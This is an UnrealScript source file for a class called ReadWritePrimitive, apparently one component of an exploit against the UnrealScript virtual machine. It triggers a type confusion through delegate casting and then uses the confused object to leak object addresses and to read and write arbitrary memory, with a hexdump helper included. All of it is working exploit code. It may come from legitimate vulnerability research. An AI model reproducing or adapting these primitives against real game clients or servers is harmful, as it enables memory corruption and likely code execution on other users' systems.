class ReadWritePrimitive extends Object dependsOn(
    RawPayloads,
    DataStructures,
    ActualConfusedObject,
    ExpectedConfusedObject
);

// after Self.Init .. this is technically an 'ActualConfusedObject' Object
//  but UScript VM considers it an 'ExpectedConfusedObject' Object
var ExpectedConfusedObject Confused;

// helper datastructures for leaking, reading memory
var array<Object> ObjLeakArray;
var Address Ptr_ObjLeakArray_Data;

var array<int> ReadWriteArray;
var Address Ptr_ReadWriteArray_Data;

delegate Object Del_MaskObject(Object Obj);
delegate ExpectedConfusedObject Del_ActualToExpected(ActualConfusedObject ActConfObj);

private static function Object MaskObject(Object obj) {
    return obj;
}

private function ExpectedConfusedObject TriggerConfuse() {
    local ActualConfusedObject ActConfObj;
    local delegate<Del_MaskObject> MaskingDelegate;
    local delegate<Del_ActualToExpected> ReturningDelegate;

    ActConfObj = new Class'ActualConfusedObject';

    MaskingDelegate = MaskObject;
    ReturningDelegate = MaskingDelegate;
    return ReturningDelegate(ActConfObj);
}

function bool Init() {
    local UnpackedArray Info;

    // ensure that ObjLeakArray, ReadWriteArray has memory for 'TArray<...>.Data'
    // XXX: it's important that *no* new array elements are appended 
    //   after these 'AddItem' calls since that will likely make Ptr_... stale!
    ReadWriteArray.AddItem(11);
    ReadWriteArray.AddItem(12);
    ReadWriteArray.AddItem(13);

    ObjLeakArray.AddItem(Self);
    ObjLeakArray.AddItem(Self);
    ObjLeakArray.AddItem(Self);

    // create a new 'ActualConfusedObject' and confuse the VM into thinking its 'ExpectedConfusedObject'
    Confused = TriggerConfuse();

    // while we're here, grab useful address info (for speeding up RWPrim API usage)
    Info = Confused.UnpackIntArray(ReadWriteArray);
    
`if(`isdefined(Arch_x86_64))
    `log("Info.Data: 0x" $ ToHex(Info.DataHigh) $ ToHex(Info.DataLow));
    Ptr_ReadWriteArray_Data.Low = Info.DataLow;
    Ptr_ReadWriteArray_Data.High = Info.DataHigh;
`else
    `log("Info.Data: 0x" $ ToHex(Info.Data));
    Ptr_ReadWriteArray_Data.Low = Info.Data;
    if(Info.Length != 0x3 || Info.Capacity != 0x4) {
        `log("error: Info{ l: 0x" $ ToHex(Info.Length) $ ", c: 0x" $ ToHex(Info.Capacity) $ " } does not match expected Info{ l: 0x3, c: 0x4 }, likely arch != 64bit!");
        return False;
    }
`endif

    `log("Info.Length: " $ ToHex(Info.Length));
    `log("Info.Capacity: " $ ToHex(Info.Capacity));

    Info = Confused.UnpackObjectArray(ObjLeakArray);
`if(`isdefined(Arch_x86_64))
    `log("Info.Data: 0x" $ ToHex(Info.DataHigh) $ ToHex(Info.DataLow));
    Ptr_ObjLeakArray_Data.Low = Info.DataLow;
    Ptr_ObjLeakArray_Data.High = Info.DataHigh;
`else
    `log("Info.Data: 0x" $ ToHex(Info.Data));
    Ptr_ObjLeakArray_Data.Low = Info.Data;
`endif

    `log("Info.Length: " $ ToHex(Info.Length));
    `log("Info.Capacity: " $ ToHex(Info.Capacity));

    return True;
}

function Address LeakObjectAddress(Object ObjToLeak) {
    local Object Tmp;
    local Address LeakedAddr;
    local UnpackedArray FakeArray;

`if(`isdefined(Arch_x86_64))
    FakeArray.DataLow = Ptr_ObjLeakArray_Data.Low;
    FakeArray.DataHigh = Ptr_ObjLeakArray_Data.High;
`else
    FakeArray.Data = Ptr_ObjLeakArray_Data.Low;
`endif

`if(`isdefined(Arch_x86_64))
    FakeArray.Length = 2;
    FakeArray.Capacity = 2;
`else
    FakeArray.Length = 1;
    FakeArray.Capacity = 1;
`endif

    Tmp = ObjLeakArray[0];
    ObjLeakArray[0] = ObjToLeak;

    LeakedAddr.Low = Confused.RepackArrayAndReadInt32(FakeArray);
`if(`isdefined(Arch_x86_64))
    LeakedAddr.High = Confused.RepackArrayAndReadInt32(FakeArray, 1);
`endif

    // restore 'Tmp' so we don't keep a reference to ObjToLeak
    ObjLeakArray[0] = Tmp;

    return LeakedAddr;
}

function UnpackedArray LeakIntArray(out array<int> Arr) {
    return Confused.UnpackIntArray(Arr);
}

function UnpackedArray LeakFString(out string Str) {
    return Confused.UnpackFString(Str);
}

function UnpackedName LeakName(name NameVal) {
    return Confused.UnpackName(NameVal);
}

function UnpackedArray LeakObjectArray(out array<Object> Arr) {
    return Confused.UnpackObjectArray(Arr);
}

function int ReadI32(Address Addr, int Offset) {
    local UnpackedArray FakeArray;

    Addr = `UTIL.Address_AddI32(Addr, Offset);

`if(`isdefined(Arch_x86_64))
    FakeArray.DataLow = Addr.Low;
    FakeArray.DataHigh = Addr.High;
`else
    FakeArray.Data = Addr.Low;
`endif

    FakeArray.Length = 1;
    FakeArray.Capacity = 1;

    return Confused.RepackArrayAndReadInt32(FakeArray);
}

function WriteI32(Address Addr, int Offset, int Value) {
    local UnpackedArray FakeArray;

    Addr = `UTIL.Address_AddI32(Addr, Offset);

`if(`isdefined(Arch_x86_64))
    FakeArray.DataLow = Addr.Low;
    FakeArray.DataHigh = Addr.High;
`else
    FakeArray.Data = Addr.Low;
`endif

    FakeArray.Length = 1;
    FakeArray.Capacity = 1;

    Confused.RepackArrayAndWriteInt32(FakeArray, Value);
}

function Address ReadAddress(Address Addr, int Offset) {
    local Address Result;
    Result.Low = ReadI32(Addr, Offset);
`if(`isdefined(Arch_x86_64))
    Result.High = ReadI32(Addr, Offset + 0x4);
`endif
    return Result;
}

function WriteAddress(Address Addr, int Offset, Address Value) {
    WriteI32(Addr, Offset, Value.Low);
`if(`isdefined(Arch_x86_64))
    WriteI32(Addr, Offset + 0x4, Value.High);
`endif
}

function HexdumpAddr(Address Addr, int Offset, int Len) {
`if(`isdefined(Arch_x86_64))
    local int I;
    for(I = 0; i < Len; I += 0x8) {
        `log(".." $ ToHex(I + Offset) $ ": 0x" $ ToHex(ReadI32(Addr, Offset + I + 0x4)) $ ToHex(ReadI32(Addr, Offset + I)));
    }
`else
    local int I;
    for(I = 0; i < Len; I += 0x4) {
        `log(".." $ ToHex(I + Offset) $ ": 0x" $ ToHex(ReadI32(Addr, Offset + I + 0x4)));
    }
`endif
}
